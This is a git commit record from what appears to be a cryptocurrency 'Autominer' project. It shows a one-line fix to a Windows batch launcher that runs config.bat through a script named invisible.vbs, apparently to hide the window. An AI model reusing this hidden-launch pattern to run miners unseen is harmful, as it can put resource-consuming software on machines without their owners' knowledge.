5f17803cab2450d74805b5584a9d8a72d89f4e44
Rickard <37144658+RickardHarrim@users.noreply.github.com>
2018-03-07 21:06:30 +0100

    fix

--- RH Autominer/laucher.bat
+++ RH Autominer/laucher.bat
@@ -1,4 +1,4 @@
-cd "C:\Users\%username%\Documents\RH Autominer"
+cd /D "C:\Users\%username%\Documents\RH Autominer"
 timeout 1 >nul
 wscript.exe "C:\Users\%username%\Documents\RH Autominer\invisible.vbs"^
 	"C:\Users\%username%\Documents\RH Autominer\config.bat"
